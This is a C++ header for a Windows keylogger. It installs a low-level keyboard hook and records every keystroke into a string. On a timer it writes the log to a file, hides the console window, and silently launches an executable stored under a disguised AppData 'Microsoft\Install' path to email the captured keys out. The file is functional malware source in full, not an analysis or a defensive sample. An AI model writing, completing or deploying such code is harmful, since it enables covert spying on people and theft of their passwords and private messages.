#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <stdlib.h>
#include <stdio.h>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"

std::string keylog = "";
int timer_time = 500;//30 seconds

void TimerSendMail()
{
    //Check if user typed something on keyboard, and if they didnt dont send anything
    if(keylog.empty())
        return;
    std::string last_file = IO::WriteLog(keylog);

    //DEBUG CODE REMOVE LATER
    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not successfull. Keylog " + keylog + "");
        return;
    }
    //Send file using python script
    const char* home_dir = getenv("USERPROFILE");
    const char* v_dir = "\\AppData\\Roaming\\Microsoft\\Install\\activate.vbs";
    const char* e_dir = "\\AppData\\Roaming\\Microsoft\\Install\\main.exe";
    //Add chars together
    char* vbs_dir = new char[strlen(home_dir)+strlen(v_dir) + 1];
    strcpy(vbs_dir, home_dir);
    strcat(vbs_dir, v_dir);
    char* exe_dir = new char[strlen(home_dir)+strlen(e_dir) + 1];
    strcpy(exe_dir, home_dir);
    strcat(exe_dir, e_dir);

    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
    FreeConsole();
    //system("explorer C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe");
    //Launch VBS File
    SHELLEXECUTEINFO shExecInfo;
    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    shExecInfo.hwnd = NULL;
    shExecInfo.lpVerb = "open";
    shExecInfo.lpFile = exe_dir;
    shExecInfo.lpParameters = NULL;
    shExecInfo.lpDirectory = vbs_dir;
    shExecInfo.nShow = SW_HIDE;//Visibility off
    shExecInfo.hInstApp = NULL;
    //Execute
    ShellExecuteEx(&shExecInfo);

    keylog = "";
    Helper::WriteAppLog("Email Sent");
}
//2000 * 60 = 2 minutes
Timer MailTimer(TimerSendMail, timer_time * 60, Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    //wparam is our key press param
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT * kbs = (KBDLLHOOKSTRUCT *)lparam;

    //Check if key was pressed
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        //Check if key was pressed and hold. We want to know if someone holds shift, what key did they type while holding shift
        keylog += Keys::KEYS[kbs->vkCode].Name;//Record the key
        if(kbs->vkCode == VK_RETURN)
            keylog += '\n';//Move on to next line if user presses enter to record more key presses
    } else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)//Check if key was released
    {
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL
                || key == VK_LCONTROL
                || key == VK_RCONTROL
                || key == VK_SHIFT
                || key == VK_LSHIFT
                || key == VK_RSHIFT
                || key == VK_MENU
                || key == VK_LMENU
                || key == VK_RMENU
                || key == VK_CAPITAL
                || key == VK_NUMLOCK
                || key == VK_LWIN
                || key == VK_RWIN
        )
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Started... Timer Started");
    MailTimer.Start(true);

    //WKL indicates that use hooks, low level hooks. OKP proccedure that is invoked every time user presses key
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,GetModuleHandle(NULL), 0);

    return eHook = NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return(bool) b;
}

bool IsHooked()
{
    return (bool)(eHook == NULL);
}

#endif // KEYBHOOK_H
